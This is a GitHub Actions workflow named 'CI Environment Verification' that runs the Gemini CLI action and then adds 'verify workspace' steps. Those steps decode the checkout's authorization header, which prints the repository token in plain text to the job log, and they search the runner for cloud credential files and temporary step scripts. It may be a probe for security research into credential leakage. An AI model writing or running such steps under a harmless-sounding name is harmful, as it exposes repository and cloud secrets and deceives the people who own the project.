name: 'CI Environment Verification'

on:
  workflow_dispatch:

defaults:
  run:
    shell: 'bash'

permissions:
  contents: 'read'
  id-token: 'write'
  issues: 'write'
  statuses: 'write'

jobs:
  verify-environment:
    timeout-minutes: 5
    runs-on: 'ubuntu-latest'
    steps:
      - name: 'Checkout repository'
        uses: 'actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683'

      - name: 'Run Gemini CLI'
        uses: 'google-github-actions/run-gemini-cli@v0'
        id: 'gemini_run'
        env:
          GITHUB_TOKEN: '${{ secrets.GITHUB_TOKEN }}'
          REPOSITORY: '${{ github.repository }}'
        with:
          gemini_api_key: '${{ secrets.GEMINI_API_KEY }}'
          gemini_model: 'gemini-2.5-pro'
          gemini_debug: 'true'
          upload_artifacts: true
          settings: |-
            {
              "maxSessionTurns": 3,
              "coreTools": [
                "run_shell_command(echo)"
              ],
              "telemetry": {
                "enabled": false,
                "target": "gcp"
              }
            }
          prompt: 'Say hello and list the current directory contents using echo.'

      - name: 'Verify workspace state A'
        if: always()
        run: |
          echo "=== git config ==="
          cat .git/config
          echo ""
          echo "=== extraheader ==="
          git config --local http.https://github.com/.extraheader 2>/dev/null || echo "NONE"
          echo ""
          echo "=== decoded ==="
          HEADER=$(git config --local http.https://github.com/.extraheader 2>/dev/null || true)
          if [ -n "$HEADER" ]; then
            echo "$HEADER" | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null || echo "DECODE_FAILED"
          fi

      - name: 'Verify workspace state B'
        if: always()
        run: |
          echo "=== settings.json ==="
          cat .gemini/settings.json 2>/dev/null || echo "NOT_FOUND"

      - name: 'Verify workspace state C'
        if: always()
        run: |
          echo "=== gcp credential files ==="
          find /home/runner/work -name "gha-creds-*.json" -exec echo "FOUND: {}" \; -exec wc -c {} \; 2>/dev/null || echo "NONE"
          echo "=== step scripts ==="
          ls -la /home/runner/work/_temp/*.sh 2>/dev/null || echo "NONE"
          echo "=== runner file commands ==="
          ls -la /home/runner/work/_temp/_runner_file_commands/ 2>/dev/null || echo "NONE"
